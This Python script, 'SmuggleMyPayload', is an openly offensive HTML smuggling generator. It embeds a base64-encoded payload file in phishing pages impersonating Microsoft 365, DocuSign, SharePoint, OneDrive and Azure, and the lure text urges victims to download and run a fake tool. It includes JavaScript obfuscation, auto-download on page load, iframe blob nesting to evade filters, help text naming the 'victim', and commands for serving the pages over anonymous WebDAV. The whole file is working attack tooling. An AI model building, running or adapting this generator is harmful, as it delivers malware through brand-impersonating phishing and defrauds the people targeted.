#!/usr/bin/env python3
import os, sys, base64, argparse, random, string
from pathlib import Path

class C:
    RED    = '\033[91m'
    GREEN  = '\033[92m'
    YELLOW = '\033[93m'
    CYAN   = '\033[96m'
    BOLD   = '\033[1m'
    DIM    = '\033[2m'
    RESET  = '\033[0m'

def red(s):    return f"{C.RED}{s}{C.RESET}"
def green(s):  return f"{C.GREEN}{s}{C.RESET}"
def yellow(s): return f"{C.YELLOW}{s}{C.RESET}"
def cyan(s):   return f"{C.CYAN}{s}{C.RESET}"
def bold(s):   return f"{C.BOLD}{s}{C.RESET}"
def dim(s):    return f"{C.DIM}{s}{C.RESET}"

BANNER = f"""{C.CYAN}{C.BOLD}
  ╔══════════════════════════════════════════════╗
  ║                                              ║
  ║   SMUGGLE  MY  PAYLOAD                       ║
  ║   ───────────────────────────────────────    ║
  ║   HTML Smuggling Generator                   ║
  ║                                              ║
  ╚══════════════════════════════════════════════╝
{C.RESET}"""

TEMPLATES = {
    '1': 'Microsoft 365 MFA Update',
    '2': 'DocuSign Document Ready',
    '3': 'SharePoint File Share',
    '4': 'OneDrive Secure Download',
    '5': 'Azure Portal Alert',
    '6': 'Generic Download Page',
    '7': 'Custom',
}

TEMPLATE_STYLES = {
    '1': {
        'title': 'Microsoft Account  Security Update Required',
        'logo': 'Microsoft', 'logo_col': '#0078d4',
        'bg': '#f3f2f1', 'card_bg': '#ffffff',
        'heading': 'Action Required: MFA Policy Update',
        'body': 'Your organization requires you to update your multi-factor authentication settings. Please download and run the configuration tool to stay compliant.',
        'btn_text': 'Download Configuration Tool', 'btn_col': '#0078d4',
        'footer': 'Microsoft Corporation · One Microsoft Way · Redmond, WA 98052', 'icon': '🔐',
    },
    '2': {
        'title': 'DocuSign  Document Ready for Review',
        'logo': 'DocuSign', 'logo_col': '#0033a0',
        'bg': '#f5f5f5', 'card_bg': '#ffffff',
        'heading': 'You have a document to review and sign',
        'body': 'John Smith has sent you a document for your review and signature. Click the button below to download the secure document package.',
        'btn_text': 'Review Document', 'btn_col': '#0033a0',
        'footer': 'DocuSign · 221 Main Street Suite 1000 · San Francisco, CA 94105', 'icon': '📄',
    },
    '3': {
        'title': 'SharePoint  Shared File Notification',
        'logo': 'SharePoint', 'logo_col': '#038387',
        'bg': '#f3f2f1', 'card_bg': '#ffffff',
        'heading': 'A file has been shared with you',
        'body': 'Sarah Johnson shared "Q3 Financial Report 2026.xlsx" with you via SharePoint. Download the file to view the latest financial summary.',
        'btn_text': 'Download File', 'btn_col': '#038387',
        'footer': 'Microsoft SharePoint · Powered by Microsoft 365', 'icon': '📊',
    },
    '4': {
        'title': 'OneDrive  Secure File Download',
        'logo': 'OneDrive', 'logo_col': '#0364b8',
        'bg': '#f3f2f1', 'card_bg': '#ffffff',
        'heading': 'Your file is ready to download',
        'body': 'The file you requested has been packaged and is ready for download. This link will expire in 24 hours.',
        'btn_text': 'Download Now', 'btn_col': '#0364b8',
        'footer': 'Microsoft OneDrive · Microsoft 365', 'icon': '☁️',
    },
    '5': {
        'title': 'Azure Portal  Security Alert',
        'logo': 'Microsoft Azure', 'logo_col': '#0089d6',
        'bg': '#1b1b1b', 'card_bg': '#2d2d2d',
        'heading': 'Security Alert: Action Required',
        'body': 'Unusual sign-in activity has been detected on your Azure subscription. Download and run the Azure Security Tool to verify your account and prevent unauthorized access.',
        'btn_text': 'Download Security Tool', 'btn_col': '#0089d6',
        'footer': 'Microsoft Azure · azure.microsoft.com', 'icon': '⚠️',
    },
    '6': {
        'title': 'Secure File Download',
        'logo': 'SecureShare', 'logo_col': '#2ecc71',
        'bg': '#f5f5f5', 'card_bg': '#ffffff',
        'heading': 'Your download is ready',
        'body': 'Your requested file has been prepared and is ready for download. Click the button below to start the download.',
        'btn_text': 'Download File', 'btn_col': '#2ecc71',
        'footer': '', 'icon': '📦',
    },
}

def rand_var(length=8):
    return '_' + ''.join(random.choices(string.ascii_lowercase, k=length))

def b64_encode(data):
    return base64.b64encode(data).decode()

def split_b64(b64, chunk_size=10000):
    return [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]

def obfuscate_js_string(s):
    return f"String.fromCharCode({','.join(str(ord(c)) for c in s)})"

def dark(style):
    return style['bg'].startswith('#1') or style['bg'].startswith('#2')

def gen_basic(payload_b64, filename, style):
    chunks = split_b64(payload_b64)
    v_arr, v_blob, v_url, v_a = rand_var(), rand_var(), rand_var(), rand_var()
    chunks_js = ',\n    '.join(f'"{c}"' for c in chunks)
    dt = '#e0e0e0' if dark(style) else '#333333'
    sc = '#aaa' if dark(style) else '#555'
    fc = '#666' if dark(style) else '#999'
    return f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{style['title']}</title>
<style>*{{box-sizing:border-box;margin:0;padding:0}}body{{font-family:'Segoe UI',system-ui,sans-serif;background:{style['bg']};display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}}.card{{background:{style['card_bg']};border-radius:8px;padding:48px 40px;max-width:520px;width:100%;box-shadow:0 2px 8px rgba(0,0,0,.12)}}.logo{{font-size:22px;font-weight:700;color:{style['logo_col']};margin-bottom:32px;display:flex;align-items:center;gap:10px}}h1{{font-size:20px;font-weight:600;color:{dt};margin-bottom:16px}}p{{font-size:14px;color:{sc};line-height:1.6;margin-bottom:28px}}.btn{{display:inline-block;padding:12px 28px;background:{style['btn_col']};color:#fff;font-size:14px;font-weight:600;border:none;border-radius:4px;cursor:pointer;transition:opacity .15s}}.btn:hover{{opacity:.9}}.bar{{height:4px;background:#e0e0e0;border-radius:4px;overflow:hidden;margin-top:28px;display:none}}.fill{{height:100%;background:{style['btn_col']};width:0;border-radius:4px;transition:width .3s ease}}.msg{{font-size:12px;color:#aaa;margin-top:6px}}.footer{{margin-top:40px;font-size:11px;color:{fc};text-align:center}}</style></head>
<body><div class="card"><div class="logo">{style['icon']} {style['logo']}</div><h1>{style['heading']}</h1><p>{style['body']}</p><button class="btn" onclick="deliver()">{style['btn_text']}</button><div class="bar" id="bar"><div class="fill" id="fill"></div></div><div class="msg" id="msg"></div></div>{f'<div class="footer">{style["footer"]}</div>' if style['footer'] else ''}
<script>(function(){{var {v_arr}=[{chunks_js}];window.deliver=function(){{var bar=document.getElementById('bar'),fill=document.getElementById('fill'),msg=document.getElementById('msg');bar.style.display='block';var steps=[[200,'Verifying...'],[700,'Decrypting...'],[1200,'Preparing...'],[1800,'Starting...']];steps.forEach(function(s,i){{setTimeout(function(){{fill.style.width=((i+1)/steps.length*100)+'%';msg.textContent=s[1];}},s[0]);}});setTimeout(function(){{var raw=atob({v_arr}.join(''));var bytes=new Uint8Array(raw.length);for(var i=0;i<raw.length;i++)bytes[i]=raw.charCodeAt(i);var {v_blob}=new Blob([bytes],{{type:'application/octet-stream'}});var {v_url}=URL.createObjectURL({v_blob});var {v_a}=document.createElement('a');{v_a}.href={v_url};{v_a}.download='{filename}';document.body.appendChild({v_a});{v_a}.click();setTimeout(function(){{URL.revokeObjectURL({v_url});}},3000);msg.textContent='Download started.';fill.style.width='100%';}},2200);}};}})()</script>
</body></html>"""

def gen_js_obfuscated(payload_b64, filename, style):
    chunks = split_b64(payload_b64, 5000)
    v_arr, v_joined, v_bytes, v_blob = rand_var(), rand_var(), rand_var(), rand_var()
    v_url, v_a, v_i, v_fn, v_dl = rand_var(), rand_var(), rand_var(), rand_var(), rand_var()
    fn_name  = obfuscate_js_string('download')
    att_name = obfuscate_js_string(filename)
    chunks_js = ',\n    '.join(f'"{c}"' for c in chunks)
    dt = '#e0e0e0' if dark(style) else '#333333'
    sc = '#aaa'   if dark(style) else '#555'
    fc = '#666'   if dark(style) else '#999'
    return f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{style['title']}</title>
<style>*{{box-sizing:border-box;margin:0;padding:0}}body{{font-family:'Segoe UI',system-ui,sans-serif;background:{style['bg']};display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}}.card{{background:{style['card_bg']};border-radius:8px;padding:48px 40px;max-width:520px;width:100%;box-shadow:0 2px 8px rgba(0,0,0,.12)}}.logo{{font-size:22px;font-weight:700;color:{style['logo_col']};margin-bottom:32px;display:flex;align-items:center;gap:10px}}h1{{font-size:20px;font-weight:600;color:{dt};margin-bottom:16px}}p{{font-size:14px;color:{sc};line-height:1.6;margin-bottom:28px}}.btn{{display:inline-block;padding:12px 28px;background:{style['btn_col']};color:#fff;font-size:14px;font-weight:600;border:none;border-radius:4px;cursor:pointer;transition:opacity .15s}}.btn:hover{{opacity:.9}}.bar{{height:3px;background:#e0e0e0;border-radius:4px;margin-top:24px;display:none}}.fill{{height:100%;width:0;background:{style['btn_col']};border-radius:4px;transition:width .4s ease}}.msg{{font-size:12px;color:#999;margin-top:6px;display:none}}.footer{{margin-top:40px;font-size:11px;color:{fc};text-align:center}}</style></head>
<body><div class="card"><div class="logo">{style['icon']} {style['logo']}</div><h1>{style['heading']}</h1><p>{style['body']}</p><button class="btn" id="btn" onclick="{v_fn}()">{style['btn_text']}</button><div class="bar" id="bar"><div class="fill" id="fill"></div></div><div class="msg" id="msg">Initializing...</div></div>{f'<div class="footer">{style["footer"]}</div>' if style['footer'] else ''}
<script>var {v_arr}=[{chunks_js}];function {v_fn}(){{document.getElementById('btn').disabled=true;document.getElementById('bar').style.display='block';document.getElementById('msg').style.display='block';var fill=document.getElementById('fill'),msg=document.getElementById('msg'),pct=0;var {v_i}=setInterval(function(){{pct+=Math.random()*15;if(pct>90)pct=90;fill.style.width=pct+'%';}},200);setTimeout(function(){{clearInterval({v_i});fill.style.width='100%';msg.textContent='Complete.';var {v_joined}={v_arr}.join('');var raw=atob({v_joined});var {v_bytes}=new Uint8Array(raw.length);for(var {v_dl}=0;{v_dl}<raw.length;{v_dl}++){v_bytes}[{v_dl}]=raw.charCodeAt({v_dl});var {v_blob}=new Blob([{v_bytes}],{{type:'application/octet-stream'}});var {v_url}=URL.createObjectURL({v_blob});var {v_a}=document.createElement('a');{v_a}.href={v_url};{v_a}[{fn_name}]={att_name};document.body.appendChild({v_a});{v_a}.click();setTimeout(function(){{URL.revokeObjectURL({v_url});}},5000);}},1800);}}</script>
</body></html>"""

def gen_auto(payload_b64, filename, style):
    chunks = split_b64(payload_b64, 8000)
    v_arr, v_b, v_url, v_a = rand_var(), rand_var(), rand_var(), rand_var()
    chunks_js = ',\n  '.join(f'"{c}"' for c in chunks)
    dt = '#e0e0e0' if dark(style) else '#333333'
    return f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{style['title']}</title>
<style>*{{box-sizing:border-box;margin:0;padding:0}}body{{font-family:'Segoe UI',system-ui,sans-serif;background:{style['bg']};display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center}}.icon{{font-size:64px;margin-bottom:20px;animation:pulse 2s infinite}}@keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:.6}}}}h1{{font-size:22px;font-weight:600;color:{dt};margin-bottom:10px}}p{{font-size:14px;color:{'#aaa' if dark(style) else '#666'};margin-bottom:6px}}a{{color:{style['btn_col']}}}</style></head>
<body><div class="icon">{style['icon']}</div><h1>{style['heading']}</h1><p>Your download is starting automatically.</p><p><small>If it doesn't start, <a href="#" onclick="go();return false;">click here</a>.</small></p>
<script>var {v_arr}=[{chunks_js}];function go(){{var raw=atob({v_arr}.join(''));var {v_b}=new Uint8Array(raw.length);for(var i=0;i<raw.length;i++){v_b}[i]=raw.charCodeAt(i);var {v_url}=URL.createObjectURL(new Blob([{v_b}],{{type:'application/octet-stream'}}));var {v_a}=document.createElement('a');{v_a}.href={v_url};{v_a}.download='{filename}';document.body.appendChild({v_a});{v_a}.click();setTimeout(function(){{URL.revokeObjectURL({v_url});}},5000);}}window.onload=function(){{setTimeout(go,800);}}</script>
</body></html>"""

def gen_iframe(payload_b64, filename, style):
    inner_b64 = base64.b64encode(gen_basic(payload_b64, filename, style).encode()).decode()
    chunks    = split_b64(inner_b64, 8000)
    v_arr, v_blob, v_url, v_f = rand_var(), rand_var(), rand_var(), rand_var()
    chunks_js = ',\n  '.join(f'"{c}"' for c in chunks)
    return f"""<!DOCTYPE html>
<html><head><title>{style['title']}</title></head>
<body style="margin:0;padding:0;overflow:hidden">
<script>var {v_arr}=[{chunks_js}];var html=atob({v_arr}.join(''));var {v_blob}=new Blob([html],{{type:'text/html'}});var {v_url}=URL.createObjectURL({v_blob});var {v_f}=document.createElement('iframe');{v_f}.src={v_url};{v_f}.style.cssText='width:100vw;height:100vh;border:0';document.body.appendChild({v_f});</script>
</body></html>"""

def ask(prompt, default=''):
    result = input(f"  {cyan('?')} {prompt}{f' [{dim(default)}]' if default else ''}: ").strip()
    return result or default

def choose(prompt, options):
    print(f"\n  {bold(prompt)}")
    for k, v in options.items():
        print(f"    {cyan(k)}) {v}")
    while True:
        choice = input(f"  {cyan('›')} ").strip()
        if choice in options:
            return choice
        print(f"  {red('Invalid')}")

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description='SmuggleMyPayload', add_help=False)
    parser.add_argument('--payload', '-p')
    parser.add_argument('--output',  '-o')
    parser.add_argument('--name',    '-n')
    parser.add_argument('--template','-t')
    parser.add_argument('--method',  '-m')
    parser.add_argument('--title')
    parser.add_argument('--help', action='store_true')
    args = parser.parse_args()

    if args.help:
        print(f"""
  {bold('Usage:')} smuggle.py [options]

  {bold('Options:')}
    {cyan('-p, --payload')}   Path to payload file
    {cyan('-o, --output')}    Output HTML file
    {cyan('-n, --name')}      Download filename shown to victim
    {cyan('-t, --template')}  Lure template 1-7
    {cyan('-m, --method')}    Delivery method 1-4
    {cyan('--title')}         Custom page title (template 7)

  {bold('Examples:')}
    python3 smuggle.py
    python3 smuggle.py -p payload.iso -o phish.html -n Invoice.iso -t 1 -m 2
    python3 smuggle.py -p update.zip -t 5 -m 3 -n AzureSecurityTool.zip
""")
        return

    print(f"  {bold('Step 1  Payload')}")
    print(f"  {'─'*50}")

    payload_path = args.payload
    while not payload_path or not os.path.exists(payload_path):
        payload_path = ask('Path to payload file (ISO, ZIP, EXE, etc.)')
        if not os.path.exists(payload_path):
            print(f"  {red('✗')} File not found: {payload_path}")
            payload_path = None

    payload_size = os.path.getsize(payload_path)
    print(f"  {green('✓')} Loaded: {bold(payload_path)} ({payload_size/1024/1024:.2f} MB)")

    filename = args.name or ask('Download filename (shown to victim)', os.path.basename(payload_path))

    print(f"\n  {dim('Encoding payload...')}  ", end='', flush=True)
    with open(payload_path, 'rb') as f:
        payload_b64 = b64_encode(f.read())
    print(green('done'))
    print(f"  {dim(f'Base64 size: {len(payload_b64)/1024:.1f} KB')}")

    print(f"\n  {bold('Step 2  Lure Template')}")
    print(f"  {'─'*50}")
    template_choice = args.template or choose('Select lure template:', TEMPLATES)

    if template_choice == '7':
        style = TEMPLATE_STYLES['6'].copy()
        style['title']    = args.title or ask('Page title', 'Secure Download')
        style['heading']  = style['title']
        style['logo']     = ask('Brand name', 'SecureShare')
        style['body']     = ask('Body text', 'Your file is ready to download.')
        style['btn_text'] = ask('Button text', 'Download Now')
        style['footer']   = ask('Footer text (leave blank for none)', '')
    else:
        style = TEMPLATE_STYLES.get(template_choice, TEMPLATE_STYLES['6'])

    print(f"  {green('✓')} Template: {bold(TEMPLATES[template_choice])}")

    print(f"\n  {bold('Step 3  Delivery Method')}")
    print(f"  {'─'*50}")
    methods = {
        '1': 'Click to download (button trigger)',
        '2': 'Click to download + JS obfuscation (recommended)',
        '3': 'Auto-download on page load',
        '4': 'Iframe blob delivery (extra layer)',
    }
    method = args.method or choose('Select delivery method:', methods)
    print(f"  {green('✓')} Method: {bold(methods[method])}")

    print(f"\n  {bold('Step 4  Output')}")
    print(f"  {'─'*50}")
    output_path = ask('Output HTML file', args.output or f"smug_{Path(payload_path).stem}.html")

    print(f"\n  {dim('Generating...')}  ", end='', flush=True)
    generators = {'1': gen_basic, '2': gen_js_obfuscated, '3': gen_auto, '4': gen_iframe}
    html = generators[method](payload_b64, filename, style)

    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(html)
    print(green('done'))

    out_size = os.path.getsize(output_path)
    print(f"""
  {'─'*50}
  {bold('Output')}
  {'─'*50}
  {bold('File')}     : {green(output_path)}
  {bold('Size')}     : {out_size/1024:.1f} KB
  {bold('Template')} : {TEMPLATES[template_choice]}
  {bold('Method')}   : {methods[method]}
  {bold('Filename')} : {filename}
  {'─'*50}

  {bold('Serve via WebDAV:')}
  {dim(f'cp {output_path} /tmp/webdav-corp/')}
  {dim('wsgidav --host=0.0.0.0 --port=8888 --root=/tmp/webdav-corp --auth=anonymous &')}

  {bold('Serve via HTTP:')}
  {dim('python3 -m http.server 8080')}
""")

if __name__ == '__main__':
    main()
